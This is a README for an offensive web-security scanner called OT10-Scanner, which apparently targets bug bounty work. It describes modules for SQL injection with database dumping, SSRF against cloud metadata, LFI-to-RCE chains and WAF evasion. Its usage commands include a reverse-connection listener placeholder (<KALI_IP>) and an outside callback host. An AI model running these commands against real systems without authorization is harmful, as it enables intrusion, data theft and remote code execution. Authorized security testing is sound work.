# OT10-Scanner: Industrial OWASP Top 10 Framework

OT10-Scanner is a modular, industrial-grade automated security auditing framework designed specifically for Bug Bounty hunters. It orchestrates a suite of specialized modules to hunt for OWASP Top 10 vulnerabilities with a heavy focus on WAF evasion, high-performance heuristics, and actionable proofs.

## 🚀 Professional Upgrades (v2.0)

- **Standardized Request Ingestion**: All core modules now natively support raw HTTP request files (Burp-style) via the `-r/--request` flag.
- **Aggressive SD-QLi Merge**: Integrated v2.8 high-performance heuristics including **Aggressive Login Bypass** (negative detection learning) and **Global Recursion** harvesting.
- **Industrial Safety Limits**: Strictly enforced `LIMIT 20` on all database dumps to ensure audit safety and bug-bounty compliance.
- **Centralized Engine**: New `evasion_utils.py` core for unified request parsing and consolidated reporting across the entire suite.
- **Detailed Manual Proofs**: Master reports now include actionable `curl` commands for manual validation of every finding.

## 🚀 Key Features

- **Industrial Orchestration**: A single master runner (`owasp_checker.py`) that manages high-tier specialized modules.
- **Advanced Evasion Engine**: Over 150+ payload variations using multi-layer encoding (Double-URL, Unicode, HPP) and junk header injection.
- **Consolidated Reporting**: Domain-specific persistence that auto-generates folders and individual bounty reports.
- **Global Auth Support**: Single-flag cookie and header injection across all modules.

## 🛠️ Specialized Modules

| Module | Core Capability | Status |
| :--- | :--- | :--- |
| `sd-qli.py` | Professional SQLi (Aggressive Bypass, Global Harvesting) | 🛡️ v2.8 Final |
| `ssrf_pro.py` | SSRF & Redirect Bypass (Cloud Metadata, IP Obfuscation) | ☁️ Cloud-Ready |
| `lfiller.py` | Advanced LFI/RCE (Standardized Ingestion, Stable V3) | ☣️ Industrial |
| `rce_fuzzer.py` | SSTI & Safe File Upload Probes | ⚡ High-Impact |
| `infohunter.py` | Misconfig & Info Disclosure "Quick Wins" | 💸 Profitable |
| `access_checker.py` | IDOR & Broken Access Control Discovery | 🔑 Critical |

## 📖 Usage Examples

### 1. Master Request Audit (Burp-Style)
```bash
python owasp_checker.py -r req.txt -All -e all
```

### 2. High-Performance SQLi Harvesting
```bash
python sd-qli.py -r req.txt --dbs --dump
```

### 3. Authenticated LFI to RCE Chain
```bash
python owasp_checker.py -u http://target.com -lfi -lh <KALI_IP> -w --cookie "session=123"
```

### 4. Direct Cloud Metadata SSRF
```bash
python ssrf_pro.py -r req.txt -ex callback.com
```

## 🛡️ Safety & Responsibility

This tool is built for **authorized security auditing only**. 
- It uses **read-only** logic for primary proofs.
- It **limits** data exfiltration to 20 records per table.
- It is designed to be **safe** for production environments during bug bounty operations.

## 📜 License
*Created by Antigravity & The Industrial Audit Team*
